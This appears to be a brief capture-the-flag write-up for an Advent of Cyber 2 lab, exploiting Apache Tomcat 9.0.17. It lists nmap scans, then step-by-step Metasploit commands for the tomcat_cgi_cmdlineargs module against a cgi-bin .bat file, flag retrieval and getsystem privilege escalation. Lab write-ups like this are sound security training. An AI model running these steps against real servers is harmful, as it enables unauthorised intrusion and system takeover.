# [Network] Metasploit

IP: 10.10.89.120

Advent of Cyber 2:

### What is the version?
- I ran 2 nmap scan, `nmap -Pn` and `nmap -Pn -sVC -vv`
- Webserver running on 8080 version `9.0.17`

### What is the CVE?
- https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/year-2019/Apache-Tomcat-9.0.17.html
- Obviously it's the higher risk one ;)

### Eploit the thing, and grab the flag :)
- https://www.rapid7.com/db/modules/exploit/windows/http/tomcat_cgi_cmdlineargs/
- From the info you'll that the cgi-bin exploit is at `<ip>/cgi-bin/elfwhacker.bat`
- `sudo -i`
- `msfconsole`
- `msf > use exploit/windows/http/tomcat_cgi_cmdlineargs `
- `msf > set LHOST <our PC>`
- `msf > set RHOST <victim>`
- `msf exploit(tomcat_cgi_cmdlineargs) > show targets`
- `msf exploit(tomcat_cgi_cmdlineargs) > set TARGET < target-id >`
- `msf exploit(tomcat_cgi_cmdlineargs) > set TARGETURI http://10.10.89.120/cgi-bin/elfwhacker.bat`
- `msf exploit(tomcat_cgi_cmdlineargs) > show options`
- `msf exploit(tomcat_cgi_cmdlineargs) > exploit`
- `ls; cat flag1.txt`

### Privilege Escalation
- `getsystem` in metasploit!!! 
- https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
